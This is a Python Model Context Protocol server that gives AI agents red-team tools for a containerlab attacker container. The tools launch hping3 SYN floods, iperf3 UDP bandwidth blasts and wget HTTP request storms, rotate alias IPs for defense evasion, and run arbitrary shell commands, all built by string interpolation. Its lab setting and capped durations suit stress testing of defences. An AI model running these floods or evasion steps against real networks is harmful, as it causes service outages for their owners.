#!/usr/bin/env python3
"""Model Context Protocol (MCP) Server for clab-clos5-attacker Node.

Exposes a rich set of Red-Teaming, Adversarial Stress Testing, and Traffic Injection
tools to AI Agents via the standard Model Context Protocol (MCP) over Stdio (JSON-RPC 2.0).

Tools Exposed:
1. get_attacker_status: Query attacker IP addresses, alias IPs, default gateway, and routes.
2. check_reachability: Execute ping probe from attacker to target destination with latency & loss stats.
3. probe_http_service: Perform HTTP GET probe using wget from attacker to target VIP.
4. launch_tcp_syn_flood: Launch TCP SYN flood using hping3 against target VIP/port.
5. launch_udp_bandwidth_blast: Launch high-bandwidth UDP saturation blast using iperf3.
6. launch_http_request_storm: Launch high-concurrency parallel HTTP worker storm.
7. rotate_attacker_ip: Add dynamic alias IP on eth1 (defense evasion) & update route source.
8. reset_attacker_network: Flush temporary alias IPs and restore baseline routing.
9. stop_all_attacks: Emergency kill switch for all background attack processes.
10. exec_attacker_command: Execute arbitrary command inside clab-clos5-attacker container.
"""

import datetime
import json
import os
import platform
import re
import subprocess
import sys
import time
from typing import Any, Dict, List, Optional, Tuple

SERVER_NAME = "clab-attacker-mcp"
SERVER_VERSION = "1.0.0"
DEFAULT_CONTAINER = "clab-clos5-attacker"
DEFAULT_WSL_DISTRO = "Ubuntu"


def strip_wsl_noise(text: str) -> str:
    """Filter out WSL2 diagnostic startup banners."""
    if not text:
        return ""
    clean_lines = []
    for line in text.splitlines():
        l_str = line.strip()
        l_condensed = "".join(l_str.split())
        if (
            l_str.startswith("wsl:")
            or l_str.startswith("w s l :")
            or "localhost" in l_condensed.lower()
            or ("wsl" in l_condensed.lower() and "nat" in l_condensed.lower())
        ):
            continue
        clean_lines.append(line)
    return "\n".join(clean_lines).strip()


class AttackerNodeController:
    """Controls and executes commands inside the clab-clos5-attacker container."""

    def __init__(
        self,
        container_name: str = DEFAULT_CONTAINER,
        wsl_distro: str = DEFAULT_WSL_DISTRO,
    ):
        self.container_name = container_name
        self.wsl_distro = wsl_distro
        self.is_windows = platform.system().lower() == "windows"

    def exec_cmd(self, command: str, timeout: int = 30) -> Tuple[int, str, str]:
        """Execute command inside the attacker container with timeout."""
        try:
            if self.is_windows:
                full_cmd = [
                    "wsl", "-d", self.wsl_distro,
                    "docker", "exec", self.container_name,
                    "sh", "-c", command
                ]
            else:
                full_cmd = [
                    "docker", "exec", self.container_name,
                    "sh", "-c", command
                ]

            proc = subprocess.run(
                full_cmd,
                capture_output=True,
                encoding="utf-8",
                errors="replace",
                timeout=timeout,
            )
            stdout = strip_wsl_noise(proc.stdout)
            stderr = strip_wsl_noise(proc.stderr)
            return proc.returncode, stdout, stderr
        except subprocess.TimeoutExpired:
            return 124, "", f"Execution timed out after {timeout} seconds"
        except Exception as exc:
            return 1, "", f"Subprocess error: {exc}"

    def get_status(self) -> Dict[str, Any]:
        """Inspect network interfaces, IP addresses, and routing on attacker."""
        # Query IP addresses
        ret_ip, out_ip, err_ip = self.exec_cmd("ip -4 addr show eth1")
        ips = []
        if ret_ip == 0 and out_ip:
            for match in re.finditer(r"inet\s+([0-9\.\/]+)", out_ip):
                ips.append(match.group(1))

        # Query Routing Table
        ret_r, out_r, _ = self.exec_cmd("ip route show")
        routes = [r.strip() for r in out_r.splitlines() if r.strip()] if ret_r == 0 else []

        # Query Active Attack Processes
        ret_ps, out_ps, _ = self.exec_cmd("ps aux")
        active_attacks = []
        if ret_ps == 0 and out_ps:
            for line in out_ps.splitlines():
                if any(tool in line for tool in ("hping3", "iperf3", "wget")):
                    active_attacks.append(line.strip())

        return {
            "node_name": self.container_name,
            "interfaces": {
                "eth1_ips": ips,
                "primary_ip": ips[0] if ips else "unknown",
                "alias_ips": ips[1:] if len(ips) > 1 else [],
            },
            "routes": routes,
            "active_attack_processes": active_attacks,
            "attack_in_progress": len(active_attacks) > 0,
            "timestamp": datetime.datetime.now().isoformat(),
        }

    def check_reachability(self, target: str = "203.0.113.10", count: int = 3, source_ip: Optional[str] = None) -> Dict[str, Any]:
        """Ping target from attacker to verify reachability and measure loss/RTT."""
        src_flag = f"-I {source_ip}" if source_ip else ""
        cmd = f"ping -c {count} -W 1 {src_flag} {target}"
        ret, out, err = self.exec_cmd(cmd, timeout=count + 5)

        loss_pct = 100.0
        rtt_stats = {"min_ms": 0.0, "avg_ms": 0.0, "max_ms": 0.0}

        loss_match = re.search(r"(\d+(?:\.\d+)?)%\s+packet loss", out)
        if loss_match:
            loss_pct = float(loss_match.group(1))

        rtt_match = re.search(r"(?:min/avg/max|round-trip min/avg/max)(?:/mdev)?\s*=\s*([\d\.]+)/([\d\.]+)/([\d\.]+)", out)
        if rtt_match:
            rtt_stats["min_ms"] = float(rtt_match.group(1))
            rtt_stats["avg_ms"] = float(rtt_match.group(2))
            rtt_stats["max_ms"] = float(rtt_match.group(3))

        is_reachable = (loss_pct < 100.0 and ret == 0)
        return {
            "target": target,
            "source_ip": source_ip or "default",
            "is_reachable": is_reachable,
            "packet_loss_percent": loss_pct,
            "rtt": rtt_stats,
            "raw_output": out,
            "firewall_drop_confirmed": loss_pct == 100.0,
        }

    def probe_http(self, target_url: str = "http://203.0.113.10", timeout: int = 3) -> Dict[str, Any]:
        """Test HTTP GET availability and latency from attacker."""
        t0 = time.time()
        cmd = f"wget -q -T {timeout} -O /dev/null {target_url}"
        ret, out, err = self.exec_cmd(cmd, timeout=timeout + 3)
        latency_ms = round((time.time() - t0) * 1000.0, 2)

        return {
            "target_url": target_url,
            "http_status_ok": ret == 0,
            "latency_ms": latency_ms,
            "exit_code": ret,
            "error_detail": err if ret != 0 else None,
        }

    def launch_syn_flood(self, target_ip: str = "203.0.113.10", port: int = 80, duration_seconds: int = 10) -> Dict[str, Any]:
        """Execute TCP SYN Flood using hping3."""
        dur = max(1, min(duration_seconds, 60))
        cmd = f"hping3 -S -p {port} --flood {target_ip} >/dev/null 2>&1 & sleep {dur}; killall -9 hping3 2>/dev/null || true"
        ret, out, err = self.exec_cmd(f'sh -c "{cmd}"', timeout=dur + 10)
        return {
            "attack_type": "TCP_SYN_FLOOD",
            "target": f"{target_ip}:{port}",
            "duration_seconds": dur,
            "status": "completed" if ret == 0 else "error",
            "stderr": err if ret != 0 else "",
        }

    def launch_udp_blast(self, target_ip: str = "203.0.113.10", bandwidth: str = "150M", duration_seconds: int = 10) -> Dict[str, Any]:
        """Execute bandwidth-saturating UDP blast using iperf3."""
        dur = max(1, min(duration_seconds, 60))
        cmd = f"iperf3 -u -b {bandwidth} -t {dur} -c {target_ip}"
        ret, out, err = self.exec_cmd(cmd, timeout=dur + 15)

        receiver_line = "N/A"
        for line in out.splitlines():
            if "receiver" in line:
                receiver_line = line.strip()

        return {
            "attack_type": "UDP_BANDWIDTH_BLAST",
            "target": target_ip,
            "bandwidth_requested": bandwidth,
            "duration_seconds": dur,
            "receiver_summary": receiver_line,
            "raw_output": out,
            "status": "completed" if ret == 0 else "error",
        }

    def launch_http_storm(self, target_url: str = "http://203.0.113.10", concurrency: int = 25, duration_seconds: int = 10) -> Dict[str, Any]:
        """Execute high-concurrency parallel HTTP request storm."""
        conc = max(1, min(concurrency, 50))
        dur = max(1, min(duration_seconds, 60))
        script = (
            f"for i in $(seq 1 {conc}); do "
            f"( while true; do wget -q -T 1 -O /dev/null {target_url} 2>/dev/null; done ) & done; "
            f"sleep {dur}; killall -9 wget 2>/dev/null || true"
        )
        ret, out, err = self.exec_cmd(f'sh -c "{script}"', timeout=dur + 10)
        return {
            "attack_type": "HTTP_REQUEST_STORM",
            "target_url": target_url,
            "concurrency_workers": conc,
            "duration_seconds": dur,
            "status": "completed" if ret == 0 else "error",
        }

    def rotate_ip(self, alias_ip: str = "192.168.100.66/24", set_as_route_src: bool = True) -> Dict[str, Any]:
        """Add dynamic secondary IP address on eth1 for defense evasion and update route source."""
        cmd_add = f"ip addr add {alias_ip} dev eth1 2>/dev/null || true"
        self.exec_cmd(cmd_add)

        clean_ip = alias_ip.split("/")[0]
        if set_as_route_src:
            cmd_route = f"ip route replace 203.0.113.0/24 via 192.168.100.1 dev eth1 src {clean_ip}"
            self.exec_cmd(cmd_route)

        status = self.get_status()
        return {
            "action": "IP_ROTATION_EVASION",
            "added_alias_ip": alias_ip,
            "active_ips": status["interfaces"]["eth1_ips"],
            "current_routes": status["routes"],
            "status": "success",
        }

    def reset_network(self) -> Dict[str, Any]:
        """Flush temporary alias IPs and restore baseline routing."""
        # Kill running attacks
        self.stop_all_attacks()

        # Remove known alias IPs
        for ip_alias in ("192.168.100.66/24", "192.168.100.77/24", "192.168.100.88/24", "192.168.100.99/24"):
            self.exec_cmd(f"ip addr del {ip_alias} dev eth1 2>/dev/null || true")

        # Restore default route to use baseline IP 192.168.100.2
        self.exec_cmd("ip route replace 203.0.113.0/24 via 192.168.100.1 dev eth1 src 192.168.100.2 2>/dev/null || true")
        self.exec_cmd("ip route replace default via 192.168.100.1 dev eth1 src 192.168.100.2 2>/dev/null || true")

        status = self.get_status()
        return {
            "action": "NETWORK_RESET_BASELINE",
            "active_ips": status["interfaces"]["eth1_ips"],
            "current_routes": status["routes"],
            "status": "restored",
        }

    def stop_all_attacks(self) -> Dict[str, Any]:
        """Terminate all background attack processes immediately."""
        self.exec_cmd("killall -9 hping3 wget iperf3 2>/dev/null || true")
        status = self.get_status()
        return {
            "action": "STOP_ALL_ATTACKS",
            "killed_processes": ["hping3", "wget", "iperf3"],
            "remaining_attacks": status["active_attack_processes"],
            "status": "stopped",
        }


# ==============================================================================
# Model Context Protocol (MCP) JSON-RPC 2.0 Server Implementation
# ==============================================================================

class AttackerMCPServer:
    """Zero-dependency Stdio MCP Server conforming to the Model Context Protocol standard."""

    def __init__(self, controller: Optional[AttackerNodeController] = None):
        self.controller = controller or AttackerNodeController()
        self.tools_schema = self._build_tools_schema()

    def _build_tools_schema(self) -> List[Dict[str, Any]]:
        """Declare JSON schemas for all exposed MCP tools."""
        return [
            {
                "name": "get_attacker_status",
                "description": "Inspect networking state of clab-clos5-attacker (IP addresses on eth1, alias IPs, routing table, active processes).",
                "inputSchema": {
                    "type": "object",
                    "properties": {},
                    "required": [],
                },
            },
            {
                "name": "check_reachability",
                "description": "Run ping probe from clab-clos5-attacker to target VIP to check reachability and verify firewall ACL blocking.",
                "inputSchema": {
                    "type": "object",
                    "properties": {
                        "target": {
                            "type": "string",
                            "description": "Target IP or hostname to probe (default: 203.0.113.10)",
                            "default": "203.0.113.10",
                        },
                        "count": {
                            "type": "integer",
                            "description": "Number of ping packets (default: 3)",
                            "default": 3,
                        },
                        "source_ip": {
                            "type": "string",
                            "description": "Optional source IP to bind with ping -I (e.g. 192.168.100.66)",
                        },
                    },
                    "required": ["target"],
                },
            },
            {
                "name": "probe_http_service",
                "description": "Probe HTTP GET service responsiveness from clab-clos5-attacker to verify target web service health.",
                "inputSchema": {
                    "type": "object",
                    "properties": {
                        "target_url": {
                            "type": "string",
                            "description": "Target URL to probe (default: http://203.0.113.10)",
                            "default": "http://203.0.113.10",
                        },
                        "timeout": {
                            "type": "integer",
                            "description": "Connection timeout in seconds (default: 3)",
                            "default": 3,
                        },
                    },
                    "required": ["target_url"],
                },
            },
            {
                "name": "launch_tcp_syn_flood",
                "description": "Launch high-frequency TCP SYN flood using hping3 to saturate port backlog and NAT connection tracking.",
                "inputSchema": {
                    "type": "object",
                    "properties": {
                        "target_ip": {
                            "type": "string",
                            "description": "Target IP to attack (e.g. 203.0.113.10)",
                            "default": "203.0.113.10",
                        },
                        "port": {
                            "type": "integer",
                            "description": "Target TCP destination port (default: 80)",
                            "default": 80,
                        },
                        "duration_seconds": {
                            "type": "integer",
                            "description": "Attack duration in seconds (default: 10, max: 60)",
                            "default": 10,
                        },
                    },
                    "required": ["target_ip"],
                },
            },
            {
                "name": "launch_udp_bandwidth_blast",
                "description": "Launch high-bandwidth UDP saturation blast using iperf3 to overdrive WAN bandwidth limit (forces TC buffer drop).",
                "inputSchema": {
                    "type": "object",
                    "properties": {
                        "target_ip": {
                            "type": "string",
                            "description": "Target IP to blast (default: 203.0.113.10)",
                            "default": "203.0.113.10",
                        },
                        "bandwidth": {
                            "type": "string",
                            "description": "Bitrate specification (e.g. '50M', '100M', '150M') (default: '150M')",
                            "default": "150M",
                        },
                        "duration_seconds": {
                            "type": "integer",
                            "description": "Attack duration in seconds (default: 10, max: 60)",
                            "default": 10,
                        },
                    },
                    "required": ["target_ip"],
                },
            },
            {
                "name": "launch_http_request_storm",
                "description": "Launch concurrent HTTP request storm using parallel worker loops to overwhelm Web server connection pool.",
                "inputSchema": {
                    "type": "object",
                    "properties": {
                        "target_url": {
                            "type": "string",
                            "description": "Target HTTP URL (default: http://203.0.113.10)",
                            "default": "http://203.0.113.10",
                        },
                        "concurrency": {
                            "type": "integer",
                            "description": "Number of concurrent parallel worker loops (default: 25, max: 50)",
                            "default": 25,
                        },
                        "duration_seconds": {
                            "type": "integer",
                            "description": "Storm duration in seconds (default: 10, max: 60)",
                            "default": 10,
                        },
                    },
                    "required": ["target_url"],
                },
            },
            {
                "name": "rotate_attacker_ip",
                "description": "Add dynamic alias IP on eth1 (defense evasion) and replace routing source to test agent subnet containment.",
                "inputSchema": {
                    "type": "object",
                    "properties": {
                        "alias_ip": {
                            "type": "string",
                            "description": "Secondary IP address with CIDR (default: 192.168.100.66/24)",
                            "default": "192.168.100.66/24",
                        },
                        "set_as_route_src": {
                            "type": "boolean",
                            "description": "Whether to replace default route source to the alias IP (default: true)",
                            "default": True,
                        },
                    },
                    "required": ["alias_ip"],
                },
            },
            {
                "name": "reset_attacker_network",
                "description": "Flush all temporary alias IPs and restore clab-clos5-attacker to clean baseline (192.168.100.2/24).",
                "inputSchema": {
                    "type": "object",
                    "properties": {},
                    "required": [],
                },
            },
            {
                "name": "stop_all_attacks",
                "description": "Emergency stop: Terminate all running attack processes (hping3, wget, iperf3) inside attacker.",
                "inputSchema": {
                    "type": "object",
                    "properties": {},
                    "required": [],
                },
            },
            {
                "name": "exec_attacker_command",
                "description": "Execute an arbitrary shell command directly inside clab-clos5-attacker container.",
                "inputSchema": {
                    "type": "object",
                    "properties": {
                        "command": {
                            "type": "string",
                            "description": "Command string to execute",
                        },
                        "timeout": {
                            "type": "integer",
                            "description": "Command timeout in seconds (default: 15)",
                            "default": 15,
                        },
                    },
                    "required": ["command"],
                },
            },
        ]

    def handle_request(self, request: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Process incoming JSON-RPC 2.0 message."""
        method = request.get("method")
        msg_id = request.get("id")
        params = request.get("params") or {}

        # 1. Initialize Handshake
        if method == "initialize":
            return {
                "jsonrpc": "2.0",
                "id": msg_id,
                "result": {
                    "protocolVersion": "2024-11-05",
                    "capabilities": {
                        "tools": {
                            "listChanged": False,
                        },
                    },
                    "serverInfo": {
                        "name": SERVER_NAME,
                        "version": SERVER_VERSION,
                    },
                },
            }

        # 2. Notification: initialized (no response required)
        elif method == "notifications/initialized":
            return None

        # 3. Ping / Liveness Check
        elif method == "ping":
            return {
                "jsonrpc": "2.0",
                "id": msg_id,
                "result": {},
            }

        # 4. List Tools
        elif method == "tools/list":
            return {
                "jsonrpc": "2.0",
                "id": msg_id,
                "result": {
                    "tools": self.tools_schema,
                },
            }

        # 5. Call Tool
        elif method == "tools/call":
            tool_name = params.get("name")
            arguments = params.get("arguments") or {}
            res_content, is_error = self._execute_tool(tool_name, arguments)
            return {
                "jsonrpc": "2.0",
                "id": msg_id,
                "result": {
                    "content": [
                        {
                            "type": "text",
                            "text": json.dumps(res_content, indent=2, ensure_ascii=False),
                        }
                    ],
                    "isError": is_error,
                },
            }

        # Unknown Method
        else:
            if msg_id is not None:
                return {
                    "jsonrpc": "2.0",
                    "id": msg_id,
                    "error": {
                        "code": -32601,
                        "message": f"Method not found: '{method}'",
                    },
                }
            return None

    def _execute_tool(self, tool_name: str, args: Dict[str, Any]) -> Tuple[Any, bool]:
        """Dispatch tool call to controller method."""
        try:
            if tool_name == "get_attacker_status":
                return self.controller.get_status(), False

            elif tool_name == "check_reachability":
                target = args.get("target", "203.0.113.10")
                count = int(args.get("count", 3))
                source_ip = args.get("source_ip")
                return self.controller.check_reachability(target=target, count=count, source_ip=source_ip), False

            elif tool_name == "probe_http_service":
                url = args.get("target_url", "http://203.0.113.10")
                timeout = int(args.get("timeout", 3))
                return self.controller.probe_http(target_url=url, timeout=timeout), False

            elif tool_name == "launch_tcp_syn_flood":
                target = args.get("target_ip", "203.0.113.10")
                port = int(args.get("port", 80))
                dur = int(args.get("duration_seconds", 10))
                return self.controller.launch_syn_flood(target_ip=target, port=port, duration_seconds=dur), False

            elif tool_name == "launch_udp_bandwidth_blast":
                target = args.get("target_ip", "203.0.113.10")
                bw = str(args.get("bandwidth", "150M"))
                dur = int(args.get("duration_seconds", 10))
                return self.controller.launch_udp_blast(target_ip=target, bandwidth=bw, duration_seconds=dur), False

            elif tool_name == "launch_http_request_storm":
                url = args.get("target_url", "http://203.0.113.10")
                conc = int(args.get("concurrency", 25))
                dur = int(args.get("duration_seconds", 10))
                return self.controller.launch_http_storm(target_url=url, concurrency=conc, duration_seconds=dur), False

            elif tool_name == "rotate_attacker_ip":
                alias_ip = args.get("alias_ip", "192.168.100.66/24")
                set_src = bool(args.get("set_as_route_src", True))
                return self.controller.rotate_ip(alias_ip=alias_ip, set_as_route_src=set_src), False

            elif tool_name == "reset_attacker_network":
                return self.controller.reset_network(), False

            elif tool_name == "stop_all_attacks":
                return self.controller.stop_all_attacks(), False

            elif tool_name == "exec_attacker_command":
                cmd = args.get("command", "uname -a")
                timeout = int(args.get("timeout", 15))
                ret, out, err = self.controller.exec_cmd(cmd, timeout=timeout)
                return {
                    "command": cmd,
                    "exit_code": ret,
                    "stdout": out,
                    "stderr": err,
                }, (ret != 0)

            else:
                return {"error": f"Unknown tool: '{tool_name}'"}, True

        except Exception as exc:
            return {"error": str(exc)}, True

    def run_stdio_server(self) -> None:
        """Run JSON-RPC 2.0 loop over stdin and stdout."""
        # Ensure UTF-8 streams
        if hasattr(sys.stdin, "reconfigure"):
            sys.stdin.reconfigure(encoding="utf-8")
        if hasattr(sys.stdout, "reconfigure"):
            sys.stdout.reconfigure(encoding="utf-8")

        for line in sys.stdin:
            line_str = line.strip()
            if not line_str:
                continue

            try:
                request = json.loads(line_str)
            except json.JSONDecodeError as exc:
                err_resp = {
                    "jsonrpc": "2.0",
                    "id": None,
                    "error": {
                        "code": -32700,
                        "message": f"Parse error: {exc}",
                    },
                }
                sys.stdout.write(json.dumps(err_resp) + "\n")
                sys.stdout.flush()
                continue

            response = self.handle_request(request)
            if response is not None:
                sys.stdout.write(json.dumps(response, ensure_ascii=False) + "\n")
                sys.stdout.flush()


def run_self_test() -> None:
    """Execute offline diagnostics on clab-clos5-attacker."""
    print("=" * 70)
    print(">>> Running Self-Test for clab-clos5-attacker MCP Server <<<")
    print("=" * 70)
    controller = AttackerNodeController()
    status = controller.get_status()
    print("[1] Attacker Status:")
    print(json.dumps(status, indent=2))

    print("\n[2] Reachability Check (Ping to 203.0.113.10):")
    reach = controller.check_reachability("203.0.113.10", count=2)
    print(json.dumps(reach, indent=2))

    print("\n[3] HTTP GET Probe (http://203.0.113.10):")
    http_res = controller.probe_http("http://203.0.113.10", timeout=2)
    print(json.dumps(http_res, indent=2))

    print("=" * 70)
    print("Self-Test Finished Successfully!")
    print("=" * 70)


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] in ("--test", "-t"):
        run_self_test()
    elif len(sys.argv) > 1 and sys.argv[1] in ("--status", "-s"):
        c = AttackerNodeController()
        print(json.dumps(c.get_status(), indent=2))
    elif len(sys.argv) > 1 and sys.argv[1] in ("--help", "-h"):
        print(f"Usage: python {sys.argv[0]} [--test | --status | --help]")
        print("Without arguments, runs as a standard Model Context Protocol (MCP) server over Stdio.")
    else:
        server = AttackerMCPServer()
        server.run_stdio_server()
